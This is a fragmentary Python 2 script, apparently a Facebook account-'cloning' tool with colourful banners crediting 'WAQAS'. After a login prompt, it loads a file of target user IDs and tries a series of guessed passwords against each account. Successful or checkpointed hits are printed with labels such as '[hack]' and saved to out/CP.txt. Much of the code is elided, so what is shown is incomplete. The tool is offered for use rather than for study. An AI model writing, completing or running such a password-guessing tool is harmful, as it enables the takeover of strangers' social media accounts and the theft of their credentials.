...
logo = """
\033[1;91m       ♦♦♦———————————————————————————————♦♦♦          
\033[1;95m 💎\033[1;91m  ___       __   ________  ________  ________  ________      
\033[1;95m 💎\033[1;92m \  \     |\  \|\   __  \|\   __  \|\   __  \|\   ____\     
\033[1;95m 💎\033[1;93m \ \  \    \ \  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \___|_    
\033[1;96m 💎\033[1;94m  \ \  \  __\ \  \ \   __  \ \  \\\  \ \   __  \ \_____  \   
\033[1;95m 💎 \033[1;95m \ \  \|\__\_\  \ \  \ \  \ \  \\\  \ \  \ \  \|____|\  \  
 \033[1;95m💎 \033[1;96m  \ \____________\ \__\ \__\ \_____  \ \__\ \__\____\_\  \ 
\033[1;95m 💎\033[1;98m    \|____________|\|__|\|__|\|___| \__\|__|\|__|\_________\
 \033[1;95m💎  \033[1;99m                              \|__|        \|_________|                                                                                                                                                                                                                                                                                            
\033[1;91m       ♦♦♦———————————————————————————————♦♦♦
"""
def tik():
	titik = ['.   ','..  ','... ']
...
\033[1;92m ____   ____  _____ _____ __    __   ___   ____   ___   
\033[1;93m|    \ /    |/ ___// ___/|  |__|  | /   \ |    \ |   \  
\033[1;94m|  o  )  o  (   \_(   \_ |  |  |  ||     ||  D  )|    \ 
\033[1;95m|   _/|     |\__  |\__  ||  |  |  ||  O  ||    / |  D  |
\033[1;96m|  |  |  _  |/  \ |/  \ ||  `  '  ||     ||    \ |     |
\033[1;98m|  |  |  |  |\    |\    | \      / |     ||  .  \|     |
\033[1;99m|__|  |__|__| \___| \___|  \_/\_/   \___/ |__|\_||_____|
                                                        

"""

jalan("\033[1;97m•◈•───────•◈ WAQAS•◈•───────•◈•")  


jalan(" \033[1;91m   ___  ___  ________  ________  ___  __    _______   ________ ")   
jalan(" \033[1;92m  |\  \|\  \|\   __  \|\   ____\|\  \|\  \ |\  ___ \ |\   __  \     ")
jalan(" \033[1;93m   \ \  \\\  \ \  \|\  \ \  \___|\ \  \/  /|\ \   __/|\ \  \|\  \    ")
jalan(" \033[1;94m   \ \   __  \ \   __  \ \  \    \ \   ___  \ \  \_|/_\ \   _  _\   ")
jalan("   \033[1;95m  \ \  \ \  \ \  \ \  \ \  \____\ \  \\ \  \ \  \_|\ \ \  \\  \|  ")
jalan("   \033[1;96m   \ \__\ \__\ \__\ \__\ \_______\ \__\\ \__\ \_______\ \__\\ _\ ")
jalan("    \033[1;97m   \|__|\|__|\|__|\|__|\|_______|\|__| \|__|\|_______|\|__|\|__| ")
...
def login():
	...
	try:
		...
		print('          \033[1;95m[◉] \x1b[1;96mLogin New Fresh Account \033[1;97m[◉]' )
		id = raw_input('          \033[1;91m[1] \033[1;95mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('          \033[1;92m[2] \033[1;95mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
		...
		if 'checkpoint' in url:
			print("\n\033[1;95m[!] Your Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;95mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
...
def pilih_super():
	...
	if peak =="":
		...
		try:
			...
			print"\033[1;31;95m[✺] Name : "+op["name"]
		except KeyError:
			print"\033[1;95m[✺] ID Not Found!"
			raw_input("\n\033[1;95m[\033[1;97mBack\033[1;9_5m]")
			super()
		print"\033[1;35;95m[✺] Getting IDs..."
		...
		print logo                  
		try:
			idlist = raw_input('\033[1;95m[+] \033[1;95mEnter the file name \033[1;95m: \033[1;95m')
	...
	jalan('                    \033[1;97mWAQASstart cloning Wait...')
	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;36;40m[After24Hr] \033[1;95m ' + user  + ' \x1b[1;36;95m|\033[1;95m ' + pass1 + ' 🐼 ' + b['name']
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;36;40m[After24Hr] \033[1;95m ' + user  + ' \x1b[1;36;95m|\033[1;95m ' + pass2 + ' 🐼 ' + b['name']
							cek = open("out/CP.txt", "a")
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;36;40m[hack] \033[1;92m ' + user  + ' \x1b[1;36;92m|\033[1;92m ' + pass3 + ' 🐼 ' + b['name']
									cek = open("out/CP.txt", "a")
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[hack] \033[1;92m ' + user  + ' \x1b[1;36;92m|\033[1;92m ' + pass4 + ' 🐼 ' + b['name']
											cek = open("out/CP.txt", "a")
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;36;40m[After24Hr] \033[1;95m ' + user  + ' \x1b[1;36;95m|\033[1;95m ' + pass5 + ' 🐼' + b['name']
													cek = open("out/CP.txt", "a")
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;36;40m[After24Hr] \033[1;95m ' + user  + ' \x1b[1;36;95m|\033[1;95m ' + pass6 + ' 🐼' + b['name']
															cek = open("out/CP.txt", "a")
															...
															if 'access_token' in q:
																...
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;36;40m[After24Hr] \033[1;95m ' + user  + ' \x1b[1;36;95m|\033[1;95m ' + pass7 + ' 🐼 ' + b['name']
																	cek = open("out/CP.txt", "a")
